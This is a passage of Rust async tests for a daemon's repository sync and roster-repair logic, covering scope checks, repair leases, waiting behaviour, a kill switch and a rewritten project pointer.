    /// no lesser API token reach it. Safe by being in no table; this says no to filing it in one.
    #[test]
    fn a_repair_is_in_no_scope_table() {
        use crate::auth::{ApiTokenLevel, Scope, permits};
        use axum::http::Method;
        for path in ["/projects/7/repair", "/projects/7/repair/begin"] {
            for scope in [
                Scope::Run(7),
                Scope::ApiToken(ApiTokenLevel::ReadOnly),
                Scope::ApiToken(ApiTokenLevel::RunCreating),
            ] {
                assert!(
                    !permits(&scope, &Method::POST, path),
                    "{scope:?} must not reach POST {path}"
                );
            }
        }
    }

    /// R9's second half, lessons L12 and L33: a tree that syncs while another session repairs the
    /// roster waits for that repair and goes on, instead of failing with `no_project`.
    #[tokio::test]
    async fn a_sync_waits_for_a_repair_under_way_and_then_resolves() {
        let fixture = stale_project().await;
        let state = &fixture.state;
        let (_trees, tree) = worktree_of(fixture.repo.path());
        repair_is_under_way(state, LONG_LEASE).await;

        let (status, answer) =
            sync_across_a_repair(&fixture, &tree, std::time::Duration::from_millis(500)).await;
        assert_eq!(status, StatusCode::OK, "{answer}");
        assert_eq!(answer["project_id"], "alpha");
        assert_eq!(
            std::fs::read_to_string(tree.join(WORKFLOW_FILE)).unwrap(),
            "the pipeline"
        );

        // The finished repair let go: a repository nobody rosters is refused without sitting out
        // the rest of the lease.
        let stranger = git_repository();
        let (status, answer) = sync(state, stranger.path()).await;
        assert_eq!(status, StatusCode::NOT_FOUND, "{answer}");
        assert_eq!(answer["refusal"], "no_project");
    }

    /// The handler takes one deadline for its git calls before it reads the roster. A wait longer
    /// than that budget must not spend it: resolving again with a deadline already past would make
    /// every root unreadable, and a repair that took a while would still end in `no_project`.
    #[tokio::test]
    async fn a_sync_that_waited_past_the_git_budget_still_resolves() {
        let fixture = stale_project().await;
        let state = &fixture.state;
        repair_is_under_way(state, LONG_LEASE).await;

        let held_for = super::DETECT_GIT_BUDGET + std::time::Duration::from_millis(500);
        let (status, answer) = sync_across_a_repair(&fixture, fixture.repo.path(), held_for).await;
        assert_eq!(status, StatusCode::OK, "{answer}");
        assert_eq!(answer["project_id"], "alpha");
    }

    /// Only what cannot be resolved waits. A repair of a project must not stop the syncs of every
    /// checkout the roster can already answer for.
    #[tokio::test]
    async fn a_sync_that_already_resolves_does_not_wait_for_a_repair() {
        let fixture = stale_project().await;
        let state = &fixture.state;
        let (status, answer) = repair(state, "alpha", &fixture.repo.path().to_string_lossy()).await;
        assert_eq!(status, StatusCode::OK, "{answer}");
        repair_is_under_way(state, LONG_LEASE).await;

        let (status, answer) = sync(state, fixture.repo.path()).await;
        assert_eq!(status, StatusCode::OK, "{answer}");
        assert_eq!(answer["project_id"], "alpha");
    }

    /// The session repairing can die. Its lease ends the wait, and what the sync then says is the
    /// plain refusal, so nothing hangs on a repair nobody will finish.
    #[tokio::test]
    async fn an_abandoned_repair_ends_the_wait_at_its_lease() {
        let fixture = stale_project().await;
        let state = &fixture.state;

        let started = std::time::Instant::now();
        repair_is_under_way(state, 1).await;
        let (status, answer) = sync(state, fixture.repo.path()).await;
        let waited = started.elapsed();

        assert_eq!(status, StatusCode::NOT_FOUND, "{answer}");
        assert_eq!(answer["refusal"], "no_project");
        assert!(
            waited >= std::time::Duration::from_millis(900),
            "the sync answered after {waited:?}, before the lease ended"
        );
    }

    /// While a repair is under way every sync without a match waits, whichever project it is about:
    /// the daemon cannot tell which one the repository will turn out to be. So nobody gets to hold
    /// that for a day, and a request that names no lease still gets a finite one.
    #[tokio::test]
    async fn a_repair_lease_is_finite_and_capped() {
        let fixture = stale_project().await;
        let state = &fixture.state;

        let (status, answer) = begin_repair(state, "alpha", 86_400).await;
        assert_eq!(status, StatusCode::OK, "{answer}");
        assert_eq!(answer["project_id"], "alpha");
        let capped = answer["lease_secs"].as_u64().unwrap();
        assert!((1..=600).contains(&capped), "{answer}");

        let (status, answer) = workflow_call(
            state.clone(),
            "POST",
            "/projects/alpha/repair/begin",
            Some(serde_json::json!({})),
        )
        .await;
        assert_eq!(status, StatusCode::OK, "{answer}");
        let default = answer["lease_secs"].as_u64().unwrap();
        assert!((1..=600).contains(&default), "{answer}");
    }

    /// A wait can outlast the kill-switch check at the top of the handler. A switch thrown during
    /// it stops the sync: nothing gets written on a check made minutes earlier.
    #[tokio::test]
    async fn the_kill_switch_thrown_during_the_wait_stops_the_sync() {
        let fixture = stale_project().await;
        let state = &fixture.state;
        repair_is_under_way(state, 2).await;

        let syncing = sync(state, fixture.repo.path());
        let killing = async {
            tokio::time::sleep(std::time::Duration::from_millis(300)).await;
            crate::governance::autopilot::set_kill_switch(&state.pool, true)
                .await
                .unwrap();
        };
        let ((status, answer), ()) = tokio::join!(syncing, killing);

        assert_eq!(status, StatusCode::LOCKED, "{answer}");
        assert_eq!(answer["refusal"], "kill_switch");
        assert!(!fixture.repo.path().join(WORKFLOW_FILE).exists());
    }

    /// Lesson L3: a `project.json` copied from another machine names a state directory that is not
    /// this daemon's. It is no source: it does not make the repository a project, nothing is
    /// written where it points, and once the roster answers the daemon's own paths replace it.
    #[tokio::test]
    async fn a_copied_project_pointer_is_no_source_and_the_daemon_rewrites_it() {
        let fixture = stale_project().await;
        let state = &fixture.state;
        let elsewhere = tempfile::tempdir().unwrap();
        let pointer_at = fixture
            .repo
            .path()
            .join(crate::workflows::materialize::PROJECT_POINTER);
        std::fs::create_dir_all(pointer_at.parent().unwrap()).unwrap();
        std::fs::write(
            &pointer_at,
            serde_json::json!({
                "id": "alpha",
                "state_dir": elsewhere.path().to_string_lossy(),
                "bundle_dir": elsewhere.path().to_string_lossy(),
            })
            .to_string(),
        )
        .unwrap();

        let (status, answer) = sync(state, fixture.repo.path()).await;
        assert_eq!(status, StatusCode::NOT_FOUND, "{answer}");
        assert_eq!(answer["refusal"], "no_project");

        let (status, answer) = repair(state, "alpha", &fixture.repo.path().to_string_lossy()).await;
        assert_eq!(status, StatusCode::OK, "{answer}");
        let (status, answer) = sync(state, fixture.repo.path()).await;
        assert_eq!(status, StatusCode::OK, "{answer}");

        let pointer: serde_json::Value =
            serde_json::from_str(&std::fs::read_to_string(&pointer_at).unwrap()).unwrap();
        assert_eq!(
            std::path::Path::new(pointer["state_dir"].as_str().unwrap()),
            std::path::absolute(fixture.home.path().join("projects/alpha")).unwrap()
        );
        assert_eq!(std::fs::read_dir(elsewhere.path()).unwrap().count(), 0);
    }
}
